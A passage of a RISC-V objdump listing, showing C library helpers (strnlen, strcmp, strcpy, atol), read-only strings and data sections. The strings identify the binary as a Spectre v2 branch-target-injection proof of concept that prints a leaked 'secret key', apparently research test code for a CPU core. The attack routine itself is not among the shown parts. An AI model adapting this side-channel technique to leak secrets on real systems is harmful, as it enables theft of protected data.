    8000264a:	f422                	sd	s0,40(sp)
    8000264c:	1800                	addi	s0,sp,48
    8000264e:	fca43c23          	sd	a0,-40(s0)
    80002652:	fcb43823          	sd	a1,-48(s0)
  const char *p = s;
    80002656:	fd843783          	ld	a5,-40(s0)
    8000265a:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    8000265e:	a031                	j	8000266a <strnlen+0x22>
    p++;
    80002660:	fe843783          	ld	a5,-24(s0)
    80002664:	0785                	addi	a5,a5,1
    80002666:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    8000266a:	fd043783          	ld	a5,-48(s0)
    8000266e:	fff78713          	addi	a4,a5,-1
    80002672:	fce43823          	sd	a4,-48(s0)
    80002676:	c791                	beqz	a5,80002682 <strnlen+0x3a>
    80002678:	fe843783          	ld	a5,-24(s0)
    8000267c:	0007c783          	lbu	a5,0(a5)
    80002680:	f3e5                	bnez	a5,80002660 <strnlen+0x18>
  return p - s;
    80002682:	fe843703          	ld	a4,-24(s0)
    80002686:	fd843783          	ld	a5,-40(s0)
    8000268a:	40f707b3          	sub	a5,a4,a5
}
    8000268e:	853e                	mv	a0,a5
    80002690:	7422                	ld	s0,40(sp)
    80002692:	6145                	addi	sp,sp,48
    80002694:	8082                	ret

0000000080002696 <strcmp>:

int strcmp(const char* s1, const char* s2)
{
    80002696:	7179                	addi	sp,sp,-48
    80002698:	f422                	sd	s0,40(sp)
    8000269a:	1800                	addi	s0,sp,48
    8000269c:	fca43c23          	sd	a0,-40(s0)
    800026a0:	fcb43823          	sd	a1,-48(s0)
  unsigned char c1, c2;

  do {
    c1 = *s1++;
    800026a4:	fd843783          	ld	a5,-40(s0)
    800026a8:	00178713          	addi	a4,a5,1
    800026ac:	fce43c23          	sd	a4,-40(s0)
    800026b0:	0007c783          	lbu	a5,0(a5)
    800026b4:	fef407a3          	sb	a5,-17(s0)
    c2 = *s2++;
    800026b8:	fd043783          	ld	a5,-48(s0)
    800026bc:	00178713          	addi	a4,a5,1
    800026c0:	fce43823          	sd	a4,-48(s0)
    800026c4:	0007c783          	lbu	a5,0(a5)
    800026c8:	fef40723          	sb	a5,-18(s0)
  } while (c1 != 0 && c1 == c2);
    800026cc:	fef44783          	lbu	a5,-17(s0)
    800026d0:	0ff7f793          	andi	a5,a5,255
    800026d4:	cb99                	beqz	a5,800026ea <strcmp+0x54>
    800026d6:	fef44703          	lbu	a4,-17(s0)
    800026da:	fee44783          	lbu	a5,-18(s0)
    800026de:	0ff77713          	andi	a4,a4,255
    800026e2:	0ff7f793          	andi	a5,a5,255
    800026e6:	faf70fe3          	beq	a4,a5,800026a4 <strcmp+0xe>

  return c1 - c2;
    800026ea:	fef44783          	lbu	a5,-17(s0)
    800026ee:	0007871b          	sext.w	a4,a5
    800026f2:	fee44783          	lbu	a5,-18(s0)
    800026f6:	2781                	sext.w	a5,a5
    800026f8:	40f707bb          	subw	a5,a4,a5
    800026fc:	2781                	sext.w	a5,a5
}
    800026fe:	853e                	mv	a0,a5
    80002700:	7422                	ld	s0,40(sp)
    80002702:	6145                	addi	sp,sp,48
    80002704:	8082                	ret

0000000080002706 <strcpy>:

char* strcpy(char* dest, const char* src)
{
    80002706:	7179                	addi	sp,sp,-48
    80002708:	f422                	sd	s0,40(sp)
    8000270a:	1800                	addi	s0,sp,48
    8000270c:	fca43c23          	sd	a0,-40(s0)
    80002710:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    80002714:	fd843783          	ld	a5,-40(s0)
    80002718:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    8000271c:	0001                	nop
    8000271e:	fd043703          	ld	a4,-48(s0)
    80002722:	00170793          	addi	a5,a4,1
    80002726:	fcf43823          	sd	a5,-48(s0)
    8000272a:	fe843783          	ld	a5,-24(s0)
    8000272e:	00178693          	addi	a3,a5,1
    80002732:	fed43423          	sd	a3,-24(s0)
    80002736:	00074703          	lbu	a4,0(a4)
    8000273a:	00e78023          	sb	a4,0(a5)
    8000273e:	0007c783          	lbu	a5,0(a5)
    80002742:	fff1                	bnez	a5,8000271e <strcpy+0x18>
    ;
  return dest;
    80002744:	fd843783          	ld	a5,-40(s0)
}
    80002748:	853e                	mv	a0,a5
    8000274a:	7422                	ld	s0,40(sp)
    8000274c:	6145                	addi	sp,sp,48
    8000274e:	8082                	ret

0000000080002750 <atol>:

long atol(const char* str)
{
    80002750:	7179                	addi	sp,sp,-48
    80002752:	f422                	sd	s0,40(sp)
    80002754:	1800                	addi	s0,sp,48
    80002756:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    8000275a:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    8000275e:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    80002762:	a031                	j	8000276e <atol+0x1e>
    str++;
    80002764:	fd843783          	ld	a5,-40(s0)
    80002768:	0785                	addi	a5,a5,1
    8000276a:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    8000276e:	fd843783          	ld	a5,-40(s0)
    80002772:	0007c783          	lbu	a5,0(a5)
    80002776:	873e                	mv	a4,a5
    80002778:	02000793          	li	a5,32
    8000277c:	fef704e3          	beq	a4,a5,80002764 <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002780:	fd843783          	ld	a5,-40(s0)
    80002784:	0007c783          	lbu	a5,0(a5)
    80002788:	873e                	mv	a4,a5
    8000278a:	02d00793          	li	a5,45
    8000278e:	00f70b63          	beq	a4,a5,800027a4 <atol+0x54>
    80002792:	fd843783          	ld	a5,-40(s0)
    80002796:	0007c783          	lbu	a5,0(a5)
    8000279a:	873e                	mv	a4,a5
    8000279c:	02b00793          	li	a5,43
    800027a0:	06f71263          	bne	a4,a5,80002804 <atol+0xb4>
    sign = *str == '-';
    800027a4:	fd843783          	ld	a5,-40(s0)
    800027a8:	0007c783          	lbu	a5,0(a5)
    800027ac:	0007871b          	sext.w	a4,a5
    800027b0:	02d00793          	li	a5,45
    800027b4:	40f707b3          	sub	a5,a4,a5
    800027b8:	0017b793          	seqz	a5,a5
    800027bc:	0ff7f793          	andi	a5,a5,255
    800027c0:	fef42223          	sw	a5,-28(s0)
    str++;
    800027c4:	fd843783          	ld	a5,-40(s0)
    800027c8:	0785                	addi	a5,a5,1
    800027ca:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    800027ce:	a81d                	j	80002804 <atol+0xb4>
    res *= 10;
    800027d0:	fe843703          	ld	a4,-24(s0)
    800027d4:	87ba                	mv	a5,a4
    800027d6:	078a                	slli	a5,a5,0x2
    800027d8:	97ba                	add	a5,a5,a4
    800027da:	0786                	slli	a5,a5,0x1
    800027dc:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    800027e0:	fd843783          	ld	a5,-40(s0)
    800027e4:	00178713          	addi	a4,a5,1
    800027e8:	fce43c23          	sd	a4,-40(s0)
    800027ec:	0007c783          	lbu	a5,0(a5)
    800027f0:	2781                	sext.w	a5,a5
    800027f2:	fd07879b          	addiw	a5,a5,-48
    800027f6:	2781                	sext.w	a5,a5
    800027f8:	873e                	mv	a4,a5
    800027fa:	fe843783          	ld	a5,-24(s0)
    800027fe:	97ba                	add	a5,a5,a4
    80002800:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    80002804:	fd843783          	ld	a5,-40(s0)
    80002808:	0007c783          	lbu	a5,0(a5)
    8000280c:	f3f1                	bnez	a5,800027d0 <atol+0x80>
  }

  return sign ? -res : res;
    8000280e:	fe442783          	lw	a5,-28(s0)
    80002812:	2781                	sext.w	a5,a5
    80002814:	c791                	beqz	a5,80002820 <atol+0xd0>
    80002816:	fe843783          	ld	a5,-24(s0)
    8000281a:	40f007b3          	neg	a5,a5
    8000281e:	a019                	j	80002824 <atol+0xd4>
    80002820:	fe843783          	ld	a5,-24(s0)
}
    80002824:	853e                	mv	a0,a5
    80002826:	7422                	ld	s0,40(sp)
    80002828:	6145                	addi	sp,sp,48
    8000282a:	8082                	ret

Disassembly of section .rodata:

0000000080002830 <.rodata>:
    80002830:	2221                	addiw	tp,tp,8
    80002832:	69685423          	0x69685423
    80002836:	54734973          	0x54734973
    8000283a:	6568                	ld	a0,200(a0)
    8000283c:	6142                	ld	sp,16(sp)
    8000283e:	7962                	ld	s2,56(sp)
    80002840:	6f42                	ld	t5,16(sp)
    80002842:	72656d6f          	jal	s10,80058f68 <_end+0x3daa8>
    80002846:	6554                	ld	a3,136(a0)
    80002848:	00007473          	csrrci	s0,ustatus,0
    8000284c:	0000                	unimp
    8000284e:	0000                	unimp
    80002850:	3d3d                	addiw	s10,s10,-17
    80002852:	3d3d                	addiw	s10,s10,-17
    80002854:	3d3d                	addiw	s10,s10,-17
    80002856:	3d3d                	addiw	s10,s10,-17
    80002858:	3d3d                	addiw	s10,s10,-17
    8000285a:	3d3d                	addiw	s10,s10,-17
    8000285c:	3d3d                	addiw	s10,s10,-17
    8000285e:	3d3d                	addiw	s10,s10,-17
    80002860:	203d                	0x203d
    80002862:	6854                	ld	a3,144(s0)
    80002864:	7369                	lui	t1,0xffffa
    80002866:	6920                	ld	s0,80(a0)
    80002868:	20612073          	csrs	0x206,sp
    8000286c:	4f50                	lw	a2,28(a4)
    8000286e:	666f2043          	fmadd.q	ft0,ft10,ft6,fa2,rdn
    80002872:	7320                	ld	s0,96(a4)
    80002874:	6570                	ld	a2,200(a0)
    80002876:	65727463          	bleu	s7,tp,80002ebe <dummyMem+0x2be>
    8000287a:	765f 2032 4228      	0x42282032765f
    80002880:	6172                	ld	sp,280(sp)
    80002882:	636e                	ld	t1,216(sp)
    80002884:	2068                	fld	fa0,192(s0)
    80002886:	6154                	ld	a3,128(a0)
    80002888:	6772                	ld	a4,280(sp)
    8000288a:	7465                	lui	s0,0xffff9
    8000288c:	4920                	lw	s0,80(a0)
    8000288e:	6a6e                	ld	s4,216(sp)
    80002890:	6365                	lui	t1,0x19
    80002892:	6974                	ld	a3,208(a0)
    80002894:	20296e6f          	jal	t3,80098a96 <_end+0x7d5d6>
    80002898:	3d3d                	addiw	s10,s10,-17
    8000289a:	3d3d                	addiw	s10,s10,-17
    8000289c:	3d3d                	addiw	s10,s10,-17
    8000289e:	3d3d                	addiw	s10,s10,-17
    800028a0:	3d3d                	addiw	s10,s10,-17
    800028a2:	3d3d                	addiw	s10,s10,-17
    800028a4:	3d3d                	addiw	s10,s10,-17
    800028a6:	3d3d                	addiw	s10,s10,-17
    800028a8:	3d3d                	addiw	s10,s10,-17
    800028aa:	3d3d                	addiw	s10,s10,-17
    800028ac:	3d3d                	addiw	s10,s10,-17
    800028ae:	3d3d                	addiw	s10,s10,-17
    800028b0:	203d                	0x203d
    800028b2:	000a                	c.slli	zero,0x2
    800028b4:	0000                	unimp
    800028b6:	0000                	unimp
    800028b8:	6874                	ld	a3,208(s0)
    800028ba:	2065                	0x2065
    800028bc:	72636573          	csrrsi	a0,0x726,6
    800028c0:	7465                	lui	s0,0xffff9
    800028c2:	6b20                	ld	s0,80(a4)
    800028c4:	7965                	lui	s2,0xffff9
    800028c6:	6920                	ld	s0,80(a0)
    800028c8:	73253a73          	csrrc	s4,0x732,a0
    800028cc:	0a20                	addi	s0,sp,280
    800028ce:	0000                	unimp
    800028d0:	3b305b1b          	0x3b305b1b
    800028d4:	333b3233          	0x333b3233
    800028d8:	6d32                	ld	s10,264(sp)
    800028da:	6176                	ld	sp,344(sp)
    800028dc:	6464                	ld	s1,200(s0)
    800028de:	5b72                	lw	s6,60(sp)
    800028e0:	3025                	0x3025
    800028e2:	3031                	0x3031
    800028e4:	5d70                	lw	a2,124(a0)
    800028e6:	203a                	fld	ft0,392(sp)
    800028e8:	746e6177          	0x746e6177
    800028ec:	2528                	fld	fa0,72(a0)
    800028ee:	3a202963          	0x3a202963
    800028f2:	2820                	fld	fs0,80(s0)
    800028f4:	6968                	ld	a0,208(a0)
    800028f6:	2d74                	fld	fa3,216(a0)
    800028f8:	6974                	ld	a3,208(a0)
    800028fa:	656d                	lui	a0,0x1b
    800028fc:	53412c73          	csrrs	s8,0x534,sp
    80002900:	4349                	li	t1,18
    80002902:	68632c43          	fmadd.s	fs8,ft6,ft6,fa3,rdn
    80002906:	7261                	lui	tp,0xffff8
    80002908:	2029                	0x2029
    8000290a:	203d                	0x203d
    8000290c:	2e31                	addiw	t3,t3,12
    8000290e:	2528                	fld	fa0,72(a0)
    80002910:	756c                	ld	a1,232(a0)
    80002912:	202c                	fld	fa1,64(s0)
    80002914:	6425                	lui	s0,0x9
    80002916:	202c                	fld	fa1,64(s0)
    80002918:	6325                	lui	t1,0x9
    8000291a:	2029                	0x2029
    8000291c:	2e32                	fld	ft8,264(sp)
    8000291e:	2528                	fld	fa0,72(a0)
    80002920:	756c                	ld	a1,232(a0)
    80002922:	202c                	fld	fa1,64(s0)
    80002924:	6425                	lui	s0,0x9
    80002926:	202c                	fld	fa1,64(s0)
    80002928:	6325                	lui	t1,0x9
    8000292a:	1b29                	addi	s6,s6,-22
    8000292c:	000a6d5b          	0xa6d5b
    80002930:	3b305b1b          	0x3b305b1b
    80002934:	333b3233          	0x333b3233
    80002938:	6d31                	lui	s10,0xc
    8000293a:	6176                	ld	sp,344(sp)
    8000293c:	6464                	ld	s1,200(s0)
    8000293e:	5b72                	lw	s6,60(sp)
    80002940:	3025                	0x3025
    80002942:	3031                	0x3031
    80002944:	5d70                	lw	a2,124(a0)
    80002946:	203a                	fld	ft0,392(sp)
    80002948:	746e6177          	0x746e6177
    8000294c:	2528                	fld	fa0,72(a0)
    8000294e:	3a202963          	0x3a202963
    80002952:	2820                	fld	fs0,80(s0)
    80002954:	6968                	ld	a0,208(a0)
    80002956:	2d74                	fld	fa3,216(a0)
    80002958:	6974                	ld	a3,208(a0)
    8000295a:	656d                	lui	a0,0x1b
    8000295c:	53412c73          	csrrs	s8,0x534,sp
    80002960:	4349                	li	t1,18
    80002962:	68632c43          	fmadd.s	fs8,ft6,ft6,fa3,rdn
    80002966:	7261                	lui	tp,0xffff8
    80002968:	2029                	0x2029
    8000296a:	203d                	0x203d
    8000296c:	2e31                	addiw	t3,t3,12
    8000296e:	2528                	fld	fa0,72(a0)
    80002970:	756c                	ld	a1,232(a0)
    80002972:	202c                	fld	fa1,64(s0)
    80002974:	6425                	lui	s0,0x9
    80002976:	202c                	fld	fa1,64(s0)
    80002978:	6325                	lui	t1,0x9
    8000297a:	2029                	0x2029
    8000297c:	2e32                	fld	ft8,264(sp)
    8000297e:	2528                	fld	fa0,72(a0)
    80002980:	756c                	ld	a1,232(a0)
    80002982:	202c                	fld	fa1,64(s0)
    80002984:	6425                	lui	s0,0x9
    80002986:	202c                	fld	fa1,64(s0)
    80002988:	6325                	lui	t1,0x9
    8000298a:	1b29                	addi	s6,s6,-22
    8000298c:	000a6d5b          	0xa6d5b
    80002990:	636d                	lui	t1,0x1b
    80002992:	6379                	lui	t1,0x1e
    80002994:	656c                	ld	a1,200(a0)
    80002996:	0000                	unimp
    80002998:	696d                	lui	s2,0x1b
    8000299a:	736e                	ld	t1,248(sp)
    8000299c:	7274                	ld	a3,224(a2)
    8000299e:	7465                	lui	s0,0xffff9
	...
    800029a8:	6d49                	lui	s10,0x12
    800029aa:	6c70                	ld	a2,216(s0)
    800029ac:	6d65                	lui	s10,0x19
    800029ae:	6e65                	lui	t3,0x19
    800029b0:	2074                	fld	fa3,192(s0)
    800029b2:	616d                	addi	sp,sp,240
    800029b4:	6e69                	lui	t3,0x1a
    800029b6:	2928                	fld	fa0,80(a0)
    800029b8:	202c                	fld	fa1,64(s0)
    800029ba:	6f66                	ld	t5,88(sp)
    800029bc:	000a216f          	jal	sp,800a49bc <_end+0x894fc>
    800029c0:	7325                	lui	t1,0xfffe9
    800029c2:	3d20                	fld	fs0,120(a0)
    800029c4:	2520                	fld	fs0,72(a0)
    800029c6:	646c                	ld	a1,200(s0)
    800029c8:	000a                	c.slli	zero,0x2
    800029ca:	0000                	unimp
    800029cc:	0000                	unimp
    800029ce:	0000                	unimp
    800029d0:	6e28                	ld	a0,88(a2)
    800029d2:	6c75                	lui	s8,0x1d
    800029d4:	296c                	fld	fa1,208(a0)
    800029d6:	0000                	unimp
    800029d8:	f73e                	sd	a5,424(sp)
    800029da:	ffff                	0xffff
    800029dc:	f928                	sd	a0,112(a0)
    800029de:	ffff                	0xffff
    800029e0:	f91a                	sd	t1,176(sp)
    800029e2:	ffff                	0xffff
    800029e4:	f928                	sd	a0,112(a0)
    800029e6:	ffff                	0xffff
    800029e8:	f928                	sd	a0,112(a0)
    800029ea:	ffff                	0xffff
    800029ec:	f928                	sd	a0,112(a0)
    800029ee:	ffff                	0xffff
    800029f0:	f928                	sd	a0,112(a0)
    800029f2:	ffff                	0xffff
    800029f4:	f71a                	sd	t1,424(sp)
    800029f6:	ffff                	0xffff
    800029f8:	f928                	sd	a0,112(a0)
    800029fa:	ffff                	0xffff
    800029fc:	f928                	sd	a0,112(a0)
    800029fe:	ffff                	0xffff
    80002a00:	f6b8                	sd	a4,104(a3)
    80002a02:	ffff                	0xffff
    80002a04:	f72e                	sd	a1,424(sp)
    80002a06:	ffff                	0xffff
    80002a08:	f928                	sd	a0,112(a0)
    80002a0a:	ffff                	0xffff
    80002a0c:	f6c2                	sd	a6,360(sp)
    80002a0e:	ffff                	0xffff
    80002a10:	f6cc                	sd	a1,168(a3)
    80002a12:	ffff                	0xffff
    80002a14:	f6cc                	sd	a1,168(a3)
    80002a16:	ffff                	0xffff
    80002a18:	f6cc                	sd	a1,168(a3)
    80002a1a:	ffff                	0xffff
    80002a1c:	f6cc                	sd	a1,168(a3)
    80002a1e:	ffff                	0xffff
    80002a20:	f6cc                	sd	a1,168(a3)
    80002a22:	ffff                	0xffff
    80002a24:	f6cc                	sd	a1,168(a3)
    80002a26:	ffff                	0xffff
    80002a28:	f6cc                	sd	a1,168(a3)
    80002a2a:	ffff                	0xffff
    80002a2c:	f6cc                	sd	a1,168(a3)
    80002a2e:	ffff                	0xffff
    80002a30:	f6cc                	sd	a1,168(a3)
    80002a32:	ffff                	0xffff
    80002a34:	f928                	sd	a0,112(a0)
    80002a36:	ffff                	0xffff
    80002a38:	f928                	sd	a0,112(a0)
    80002a3a:	ffff                	0xffff
    80002a3c:	f928                	sd	a0,112(a0)
    80002a3e:	ffff                	0xffff
    80002a40:	f928                	sd	a0,112(a0)
    80002a42:	ffff                	0xffff
    80002a44:	f928                	sd	a0,112(a0)
    80002a46:	ffff                	0xffff
    80002a48:	f928                	sd	a0,112(a0)
    80002a4a:	ffff                	0xffff
    80002a4c:	f928                	sd	a0,112(a0)
    80002a4e:	ffff                	0xffff
    80002a50:	f928                	sd	a0,112(a0)
    80002a52:	ffff                	0xffff
    80002a54:	f928                	sd	a0,112(a0)
    80002a56:	ffff                	0xffff
    80002a58:	f928                	sd	a0,112(a0)
    80002a5a:	ffff                	0xffff
    80002a5c:	f928                	sd	a0,112(a0)
    80002a5e:	ffff                	0xffff
    80002a60:	f928                	sd	a0,112(a0)
    80002a62:	ffff                	0xffff
    80002a64:	f928                	sd	a0,112(a0)
    80002a66:	ffff                	0xffff
    80002a68:	f928                	sd	a0,112(a0)
    80002a6a:	ffff                	0xffff
    80002a6c:	f928                	sd	a0,112(a0)
    80002a6e:	ffff                	0xffff
    80002a70:	f928                	sd	a0,112(a0)
    80002a72:	ffff                	0xffff
    80002a74:	f928                	sd	a0,112(a0)
    80002a76:	ffff                	0xffff
    80002a78:	f928                	sd	a0,112(a0)
    80002a7a:	ffff                	0xffff
    80002a7c:	f928                	sd	a0,112(a0)
    80002a7e:	ffff                	0xffff
    80002a80:	f928                	sd	a0,112(a0)
    80002a82:	ffff                	0xffff
    80002a84:	f928                	sd	a0,112(a0)
    80002a86:	ffff                	0xffff
    80002a88:	f928                	sd	a0,112(a0)
    80002a8a:	ffff                	0xffff
    80002a8c:	f928                	sd	a0,112(a0)
    80002a8e:	ffff                	0xffff
    80002a90:	f928                	sd	a0,112(a0)
    80002a92:	ffff                	0xffff
    80002a94:	f928                	sd	a0,112(a0)
    80002a96:	ffff                	0xffff
    80002a98:	f928                	sd	a0,112(a0)
    80002a9a:	ffff                	0xffff
    80002a9c:	f928                	sd	a0,112(a0)
    80002a9e:	ffff                	0xffff
    80002aa0:	f928                	sd	a0,112(a0)
    80002aa2:	ffff                	0xffff
    80002aa4:	f928                	sd	a0,112(a0)
    80002aa6:	ffff                	0xffff
    80002aa8:	f928                	sd	a0,112(a0)
    80002aaa:	ffff                	0xffff
    80002aac:	f928                	sd	a0,112(a0)
    80002aae:	ffff                	0xffff
    80002ab0:	f928                	sd	a0,112(a0)
    80002ab2:	ffff                	0xffff
    80002ab4:	f928                	sd	a0,112(a0)
    80002ab6:	ffff                	0xffff
    80002ab8:	f928                	sd	a0,112(a0)
    80002aba:	ffff                	0xffff
    80002abc:	f928                	sd	a0,112(a0)
    80002abe:	ffff                	0xffff
    80002ac0:	f928                	sd	a0,112(a0)
    80002ac2:	ffff                	0xffff
    80002ac4:	f928                	sd	a0,112(a0)
    80002ac6:	ffff                	0xffff
    80002ac8:	f928                	sd	a0,112(a0)
    80002aca:	ffff                	0xffff
    80002acc:	f928                	sd	a0,112(a0)
    80002ace:	ffff                	0xffff
    80002ad0:	f928                	sd	a0,112(a0)
    80002ad2:	ffff                	0xffff
    80002ad4:	f928                	sd	a0,112(a0)
    80002ad6:	ffff                	0xffff
    80002ad8:	f76e                	sd	s11,424(sp)
    80002ada:	ffff                	0xffff
    80002adc:	f86e                	sd	s11,48(sp)
    80002ade:	ffff                	0xffff
    80002ae0:	f928                	sd	a0,112(a0)
    80002ae2:	ffff                	0xffff
    80002ae4:	f928                	sd	a0,112(a0)
    80002ae6:	ffff                	0xffff
    80002ae8:	f928                	sd	a0,112(a0)
    80002aea:	ffff                	0xffff
    80002aec:	f928                	sd	a0,112(a0)
    80002aee:	ffff                	0xffff
    80002af0:	f928                	sd	a0,112(a0)
    80002af2:	ffff                	0xffff
    80002af4:	f928                	sd	a0,112(a0)
    80002af6:	ffff                	0xffff
    80002af8:	f928                	sd	a0,112(a0)
    80002afa:	ffff                	0xffff
    80002afc:	f762                	sd	s8,424(sp)
    80002afe:	ffff                	0xffff
    80002b00:	f928                	sd	a0,112(a0)
    80002b02:	ffff                	0xffff
    80002b04:	f928                	sd	a0,112(a0)
    80002b06:	ffff                	0xffff
    80002b08:	f8b6                	sd	a3,112(sp)
    80002b0a:	ffff                	0xffff
    80002b0c:	f8be                	sd	a5,112(sp)
    80002b0e:	ffff                	0xffff
    80002b10:	f928                	sd	a0,112(a0)
    80002b12:	ffff                	0xffff
    80002b14:	f928                	sd	a0,112(a0)
    80002b16:	ffff                	0xffff
    80002b18:	f78a                	sd	sp,488(sp)
    80002b1a:	ffff                	0xffff
    80002b1c:	f928                	sd	a0,112(a0)
    80002b1e:	ffff                	0xffff
    80002b20:	f8ae                	sd	a1,112(sp)
    80002b22:	ffff                	0xffff
    80002b24:	f928                	sd	a0,112(a0)
    80002b26:	ffff                	0xffff
    80002b28:	f928                	sd	a0,112(a0)
    80002b2a:	ffff                	0xffff
    80002b2c:	f8e0                	sd	s0,240(s1)
    80002b2e:	ffff                	0xffff

Disassembly of section .data:

0000000080002b40 <array1>:
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
    80002b40:	0201                	addi	tp,tp,0
    80002b42:	06050403          	lb	s0,96(a0) # 1b060 <_tbss_end+0x1afdc>
    80002b46:	0a090807          	0xa090807
    80002b4a:	0e0d0c0b          	0xe0d0c0b
    80002b4e:	0000100f          	fence.i
	...

Disassembly of section .sdata:

0000000080002be0 <array1_sz>:
uint64_t array1_sz = 16;
    80002be0:	0010                	0x10
    80002be2:	0000                	unimp
    80002be4:	0000                	unimp
	...

0000000080002be8 <secretString>:
char* secretString = "!\"#ThisIsTheBabyBoomerTest";
    80002be8:	2830                	fld	fa2,80(s0)
    80002bea:	8000                	0x8000
    80002bec:	0000                	unimp
	...

Disassembly of section .bss:

0000000080002c00 <dummyMem>:
	...

0000000080016c00 <unused1>:
	...

0000000080016c40 <unused2>:
	...

0000000080016c80 <array2>:
	...

000000008001ac80 <results.2502>:
	...

000000008001b480 <counters>:
	...

000000008001b490 <counter_names>:
	...

000000008001b4a0 <count.2896>:
    8001b4a0:	0000                	unimp
	...

000000008001b4a4 <sense.2895>:
    8001b4a4:	0000                	unimp
	...

Disassembly of section .tbss:

000000008001b4c0 <_tls_data>:
	...

Disassembly of section .debug_info:

0000000000000000 <.debug_info>:
       0:	0d8d                	addi	s11,s11,3
       2:	0000                	unimp
       4:	0004                	0x4
       6:	0000                	unimp
       8:	0000                	unimp
       a:	0108                	addi	a0,sp,128
       c:	02b1                	addi	t0,t0,12
       e:	0000                	unimp
      10:	230c                	fld	fa1,0(a4)
      12:	0005                	c.nop	1
      14:	a700                	fsd	fs0,8(a4)
      16:	0004                	0x4
      18:	4800                	lw	s0,16(s0)
      1a:	0010                	0x10
      1c:	0080                	addi	s0,sp,64
      1e:	0000                	unimp
      20:	a200                	fsd	fs0,0(a2)
      22:	0005                	c.nop	1
	...
      2c:	0200                	addi	s0,sp,256
      2e:	0601                	addi	a2,a2,0
      30:	03c8                	addi	a0,sp,452
      32:	0000                	unimp
      34:	00003003          	ld	zero,0(zero) # 0 <_tdata_begin>
      38:	0300                	addi	s0,sp,384
      3a:	00003f2b          	0x3f2b
      3e:	0200                	addi	s0,sp,256
      40:	0801                	addi	a6,a6,0
      42:	03c6                	slli	t2,t2,0x11
      44:	0000                	unimp
      46:	0202                	slli	tp,tp,0x0
      48:	eb05                	bnez	a4,78 <buf.2990+0x38>
      4a:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
      4e:	0702                	slli	a4,a4,0x0
      50:	023c                	addi	a5,sp,264
      52:	0000                	unimp
      54:	0404                	addi	s1,sp,512
      56:	6905                	lui	s2,0x1
      58:	746e                	ld	s0,248(sp)
      5a:	0200                	addi	s0,sp,256
      5c:	0704                	addi	s1,sp,896
      5e:	0078                	addi	a4,sp,12
      60:	0000                	unimp
      62:	00009303          	lh	t1,0(ra)
      66:	0300                	addi	s0,sp,384
      68:	00006d67          	0x6d67
      6c:	0200                	addi	s0,sp,256
      6e:	0508                	addi	a0,sp,640
      70:	00ee                	slli	ra,ra,0x1b
      72:	0000                	unimp
      74:	00039203          	lh	tp,0(t2)
      78:	0300                	addi	s0,sp,384
      7a:	7f69                	lui	t5,0xffffa
      7c:	0000                	unimp
      7e:	0200                	addi	s0,sp,256
      80:	0708                	addi	a0,sp,896
      82:	00000073          	ecall
      86:	0802                	slli	a6,a6,0x0
      88:	e905                	bnez	a0,b8 <_tbss_end+0x34>
      8a:	0000                	unimp
      8c:	0200                	addi	s0,sp,256
      8e:	0410                	addi	a2,sp,512
      90:	0336                	slli	t1,t1,0xd
      92:	0000                	unimp
      94:	0003a703          	lw	a4,0(t2)
      98:	0400                	addi	s0,sp,512
      9a:	00005407          	0x5407
      9e:	0300                	addi	s0,sp,384
      a0:	037d                	addi	t1,t1,31
      a2:	0000                	unimp
      a4:	2c05                	addiw	s8,s8,1
      a6:	006d                	c.nop	27
      a8:	0000                	unimp
      aa:	0004d603          	lhu	a2,0(s1)
      ae:	0500                	addi	s0,sp,640
      b0:	6d72                	ld	s10,280(sp)
      b2:	0000                	unimp
      b4:	0300                	addi	s0,sp,384
      b6:	00000597          	auipc	a1,0x0
      ba:	9105                	srli	a0,a0,0x21
      bc:	006d                	c.nop	27
      be:	0000                	unimp
      c0:	8a05                	andi	a2,a2,1
      c2:	0002                	c.slli	zero,0x0
      c4:	0600                	addi	s0,sp,768
      c6:	0165                	addi	sp,sp,25
      c8:	0000005b          	0x5b
      cc:	0406                	slli	s0,s0,0x1
      ce:	a605                	j	3ee <_tbss_end+0x36a>
      d0:	000000eb          	0xeb
      d4:	00028407          	0x28407
      d8:	0500                	addi	s0,sp,640
      da:	c0a8                	sw	a0,64(s1)
      dc:	0000                	unimp
      de:	0700                	addi	s0,sp,896
      e0:	00000207          	0x207
      e4:	a905                	j	514 <_tbss_end+0x490>
      e6:	000000eb          	0xeb
      ea:	0800                	addi	s0,sp,16
      ec:	0000003f 000000fb 	0xfb0000003f
      f4:	7f09                	lui	t5,0xfffe2
      f6:	0000                	unimp
      f8:	0300                	addi	s0,sp,384
      fa:	0a00                	addi	s0,sp,272
      fc:	0508                	addi	a0,sp,640
      fe:	00011ca3          	sh	zero,25(sp)
     102:	0b00                	addi	s0,sp,400
     104:	0491                	addi	s1,s1,4
     106:	0000                	unimp
     108:	a505                	j	728 <_tbss_end+0x6a4>
     10a:	0054                	addi	a3,sp,4
     10c:	0000                	unimp
     10e:	0b00                	addi	s0,sp,400
     110:	0499                	addi	s1,s1,6
     112:	0000                	unimp
     114:	aa05                	j	244 <_tbss_end+0x1c0>
     116:	00cc                	addi	a1,sp,68
     118:	0000                	unimp
     11a:	0004                	0x4
     11c:	00041303          	lh	t1,0(s0) # ffffffffffff9000 <_end+0xffffffff7ffddb40>
     120:	0500                	addi	s0,sp,640
     122:	0000fbab          	0xfbab
     126:	0300                	addi	s0,sp,384
     128:	01be                	slli	gp,gp,0xf
     12a:	0000                	unimp
     12c:	af05                	j	85c <_tbss_end+0x7d8>
     12e:	0094                	addi	a3,sp,64
     130:	0000                	unimp
     132:	080c                	addi	a1,sp,16
     134:	00053903          	ld	s2,0(a0)
     138:	0700                	addi	s0,sp,896
     13a:	5b19                	li	s6,-26
     13c:	0000                	unimp
     13e:	0d00                	addi	s0,sp,656
     140:	000001cf          	fnmadd.s	ft3,ft0,ft0,ft0,rne
     144:	0720                	addi	s0,sp,904
     146:	0001922f          	0x1922f
     14a:	0b00                	addi	s0,sp,400
